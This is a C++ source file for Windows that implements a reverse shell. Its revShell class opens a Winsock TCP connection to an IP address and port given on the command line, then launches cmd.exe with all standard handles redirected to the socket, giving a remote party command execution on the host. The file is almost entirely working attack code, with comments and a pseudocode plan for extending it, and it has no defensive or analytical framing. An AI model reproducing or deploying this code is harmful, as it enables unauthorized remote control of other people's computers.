#include <cstdlib>
#include <handleapi.h>
#include <processthreadsapi.h>
#include <psdk_inc/_socket_types.h>
#include <stdio.h>
#include <cstring>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>
#include <iostream>


using namespace std;
typedef CONST CHAR *PCSTR;
bool resultMain;


//USE THESE LATER FOR CASE BY CASE BASIS
#define DEFAULT_PORT "999"
#define DEFALT_IP "X.X.X.X"
#define DEFAULT_BUFLEN 1024


class revShell
{
	public:
		//UNIVERSAL CLASS ATTRIBUTES
		//client and server ips and ports
		char *port;
		char *ip;
		//contains information about the Windows Sockets implementation.
		WSADATA wsaData;
		//holds host address information.
		struct addrinfo *svrResult = NULL,
		*svrPtr = NULL,
		ServerAddrInfo;
		//The socket itself
		SOCKET MySocket = INVALID_SOCKET;
		//Vars for cmd process
		STARTUPINFO si;
		PROCESS_INFORMATION pi;


		//CLASS FUNCTIONS
		//constructor
		revShell(char *usrPort, char *usrIp)
		{
			port = usrPort;
			ip = usrIp;
		}
		//destrutor
		~revShell()
		{
			if (MySocket != INVALID_SOCKET)
			{
				closesocket(MySocket);
				MySocket = INVALID_SOCKET;
			}
			if (svrResult != NULL)
			{
				freeaddrinfo(svrResult);
				svrResult = NULL;
			}
			if (pi.hProcess != INVALID_HANDLE_VALUE)
			{
				CloseHandle(pi.hProcess);
				pi.hProcess = NULL;
			}
			if (pi.hThread != INVALID_HANDLE_VALUE)
			{
				CloseHandle(pi.hThread);
				pi.hThread = NULL;
			}
			//cleans up the library right before exit
			WSACleanup();
		}


		//here we initialize the win dlls for makeing sockets
		bool initWinsock()
		{
			int iResult;
			//The WSAStartup function initiates use of the Winsock DLL by a process.
			iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
			if (iResult != 0)
			{
				printf("Failed to initialize Winsock Lib: %d\n", iResult);
				return FALSE;
			}
			return TRUE;
		}


		bool createWinsock()
		{
			//making sure the memory for the addrinfo struct on the stack is good.
			ZeroMemory( &ServerAddrInfo, sizeof(ServerAddrInfo) );
			ServerAddrInfo.ai_family   = AF_INET;
			ServerAddrInfo.ai_socktype = SOCK_STREAM;
			ServerAddrInfo.ai_protocol = IPPROTO_TCP;

			// Resolve the server address and port to the addrinfo struct
			DWORD initServerAddrInfo = getaddrinfo(ip, port, &ServerAddrInfo, &svrResult);
			if (initServerAddrInfo != 0) {
				//https://learn.microsoft.com/en-us/windows/win32/winsock/windows-sockets-error-codes-2
				//here are the codes 
				printf("Failed to initialize addr/interface information: %d\n", initServerAddrInfo);
				return FALSE;
			}

			//making the socket
			//making the pointer to the addrinfo eq to results of get addrinfo
			svrPtr=svrResult;
			// Define the socket with the addrinfo
			MySocket = WSASocket(svrPtr->ai_family, svrPtr->ai_socktype, svrPtr->ai_protocol, NULL, (unsigned int)NULL, (unsigned int)NULL);
			if (MySocket == INVALID_SOCKET) {
				printf("Error at making socket with socket(): %ld\n", WSAGetLastError());
				freeaddrinfo(svrResult);
				svrResult = NULL;
				return FALSE;
			}
			return TRUE;
		}


		bool connectSocket()
		{
			int iResult;
			// Connect to server.
			//iResult = WSAConnect(MySocket, svrPtr->ai_addr, 
			iResult = WSAConnect(MySocket, svrPtr->ai_addr, (int)svrPtr->ai_addrlen, NULL, NULL, NULL, NULL);
			if (iResult == SOCKET_ERROR) {
				if (MySocket != INVALID_SOCKET)
				{
					closesocket(MySocket);
					MySocket = INVALID_SOCKET;
				}
				cout << "got a socket error";
				MySocket = INVALID_SOCKET;
			}
			// Should really try the next address returned by getaddrinfo
			// if the connect call failed
			// But for this simple example we just free the resources
			// returned by getaddrinfo and print an error message
			freeaddrinfo(svrResult);
			svrResult = NULL;
			if (MySocket == INVALID_SOCKET) {
				printf("Unable to connect to server!\n");
				cout << svrPtr->ai_addr;
				return FALSE;
			}
			
			//this is for when all things go correct
			maintainConnection();
			return TRUE;
		}


		//this is the while loop before the return of the start connection
		bool maintainConnection()
		{
			//zeroing out the startup info and process info
			ZeroMemory( &si, sizeof(si) );
			si.cb = sizeof(si);
			ZeroMemory( &pi, sizeof(pi) );

			//setting the stdout and stderr to the socket
			si.dwFlags = STARTF_USESTDHANDLES;
			si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) MySocket;

			unsigned int Result = CreateProcess( 
			NULL,
			"cmd.exe",
			NULL,
			NULL, //this one you can change to allow other sub-processes to be inherited. Don't think it matters too much bc we haalready have redirected stout, stdin and stderr
			TRUE,
			0,
			NULL,
			NULL,
			&si,
			&pi);
			
			if (Result == 0)
			{
				printf("Create process failed");
				//closing process and thread handles
				if (pi.hProcess != INVALID_HANDLE_VALUE)
				{
					CloseHandle(pi.hProcess);
					pi.hProcess = NULL;
				}
				if (pi.hThread != INVALID_HANDLE_VALUE)
				{
					CloseHandle(pi.hThread);
					pi.hThread = NULL;
				}
				return FALSE;
			}
			return TRUE;
		}
		
		
		bool closeConnection()
		{
			DWORD lpExitCode;
			GetExitCodeProcess(pi.hProcess, &lpExitCode);
			while (lpExitCode == STILL_ACTIVE)
			{
				GetExitCodeProcess(pi.hProcess, &lpExitCode);
				Sleep(1000);
			}
			//closing process handles and thread handles
			if (pi.hProcess != INVALID_HANDLE_VALUE)
			{
				CloseHandle(pi.hProcess);
				pi.hProcess = NULL;
			}
			if (pi.hThread != INVALID_HANDLE_VALUE)
			{
				CloseHandle(pi.hThread);
				pi.hThread = NULL;
			}
			

			//shutting down socket
			int iResult;
			iResult = shutdown(MySocket, SD_SEND);

			if (iResult == SOCKET_ERROR) {
				printf("shutdown failed: %d\n", WSAGetLastError());
				if (MySocket != INVALID_SOCKET)
				{
					closesocket(MySocket);
					MySocket = INVALID_SOCKET;
				}
				return FALSE;
			}
			return TRUE;
		}
};




int main(int argc, char *argv[])
{
	//checking args
	if (argc != 3)
	{//checking num of args
		cout << "Please enter port and ip as args";
		return EXIT_FAILURE;
	}//check for syntax later

	//creating new revShell 
	revShell* myShell = new revShell(argv[1], argv[2]);
	//initializing the dll for winsocks
	resultMain = myShell->initWinsock();
	if (!resultMain)
	{
	    delete myShell;
		return EXIT_FAILURE;
	}
	//making the addr information and creating our socket
	resultMain = myShell->createWinsock();
	if (!resultMain)
	{
		delete myShell;
		return EXIT_FAILURE;
	}
	//making the connection to the server
	resultMain = myShell->connectSocket();
	if (!resultMain)
	{
		delete myShell;
		return EXIT_FAILURE;
	}
	resultMain = myShell->closeConnection();
	if (!resultMain)
	{
		delete myShell;
		return EXIT_FAILURE;
	}
	delete myShell;
	return EXIT_SUCCESS;
}

/*
PSEUDOCODE

1) Client executes the command that is send back.
  * Do some research on the heap
    * Figure out how to allocate memory for our char array.
	* Also determine the differences between the stack and the heap
  * Sends back the response
  *
2) Implement Loop
  * Executes command and return the stderr and stdout, then it will send the prompt again.
  * Exits if the command is exit
  * Or prints error as else
*/
